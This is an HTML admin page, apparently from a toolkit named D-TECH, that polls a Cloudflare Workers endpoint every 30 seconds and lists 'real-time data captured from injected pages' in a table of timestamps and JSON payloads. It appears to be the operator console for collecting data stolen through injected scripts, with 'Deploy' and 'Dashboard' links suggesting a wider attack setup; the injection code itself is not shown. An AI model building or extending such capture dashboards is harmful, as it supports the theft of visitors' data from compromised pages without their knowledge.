<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Captured Data - D-TECH</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <nav class="navbar">
        <a href="index.html" class="navbar-brand">
            <img src="logo.png" alt="D-TECH Logo">
            D-TECH Admin
        </a>
        <div class="nav-links">
            <a href="index.html">Deploy</a>
            <a href="dashboard.html">Dashboard</a>
            <a href="admin.html" class="active">Admin</a>
        </div>
    </nav>

    <div class="container">
        <div class="card">
            <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom: 2rem;">
                <h1 style="margin:0;">üïµÔ∏è Captured Data Logs</h1>
                <a href="admin.html" style="color: var(--primary-color); font-weight: bold; text-decoration: none;">&larr; Back to Admin</a>
            </div>

            <p class="text-muted">Real-time data captured from injected pages. Refreshes every 30s.</p>

            <div id="loading" class="text-center text-muted">Loading data...</div>
            <table id="data-table" style="display:none;">
                <thead>
                    <tr>
                        <th style="width: 180px;">Time</th>
                        <th>Data Payload</th>
                    </tr>
                </thead>
                <tbody id="table-body">
                </tbody>
            </table>
        </div>
    </div>

    <script>
        const WORKER_URL = 'https://calm-bread-1d99.testdx24.workers.dev';

        async function loadData() {
            try {
                const response = await fetch(`${WORKER_URL}/api/captures`, { credentials: 'include' });

                if (response.status === 401) {
                    window.location.href = 'login.html';
                    return;
                }

                const result = await response.json();

                if (result.success) {
                    renderTable(result.data);
                } else {
                    const loading = document.getElementById('loading');
                    loading.innerText = 'Error loading data: ' + result.error;
                    loading.className = 'message error';
                    loading.style.display = 'block';
                }
            } catch (err) {
                const loading = document.getElementById('loading');
                loading.innerText = 'Network Error: ' + err.message;
                loading.className = 'message error';
                loading.style.display = 'block';
            }
        }

        function renderTable(data) {
            const tbody = document.getElementById('table-body');
            const table = document.getElementById('data-table');
            const loading = document.getElementById('loading');

            loading.style.display = 'none';
            table.style.display = 'table';
            tbody.innerHTML = '';

            if (data.length === 0) {
                const tr = document.createElement('tr');
                const td = document.createElement('td');
                td.colSpan = 2;
                td.style.textAlign = 'center';
                td.style.padding = '40px';
                td.style.color = 'var(--text-muted)';
                td.textContent = 'No captured data yet.';
                tr.appendChild(td);
                tbody.appendChild(tr);
                return;
            }

            data.forEach(item => {
                const row = document.createElement('tr');

                const date = new Date(item.timestamp);
                const timeStr = date.toLocaleString();
                const jsonStr = JSON.stringify(item.data, null, 2);

                const timeCell = document.createElement('td');
                timeCell.style.color = 'var(--text-muted)';
                timeCell.style.fontSize = '0.9em';
                timeCell.style.whiteSpace = 'nowrap';
                timeCell.textContent = timeStr;

                const dataCell = document.createElement('td');
                const pre = document.createElement('pre');
                pre.textContent = jsonStr;
                dataCell.appendChild(pre);

                row.appendChild(timeCell);
                row.appendChild(dataCell);

                tbody.appendChild(row);
            });
        }

        // Load on start
        loadData();

        // Refresh every 30 seconds
        setInterval(loadData, 30000);
    </script>
</body>
</html>
